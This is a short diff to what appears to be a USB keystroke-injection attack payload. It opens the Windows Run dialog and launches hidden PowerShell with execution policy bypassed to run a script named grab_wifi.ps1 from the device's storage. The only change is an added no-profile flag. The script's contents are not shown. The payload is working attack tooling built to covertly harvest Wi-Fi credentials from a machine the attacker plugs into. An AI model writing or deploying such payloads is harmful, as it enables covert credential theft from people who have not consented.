@@ -4,5 +4,5 @@ ATTACKMODE HID STORAGE
 DELAY 1000
 GUI r
 DELAY 200
-STRING cmd /c "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File D:\grab_wifi.ps1"
+STRING cmd /c "powershell -NoP -WindowStyle Hidden -ExecutionPolicy Bypass -File D:\grab_wifi.ps1"
 ENTER
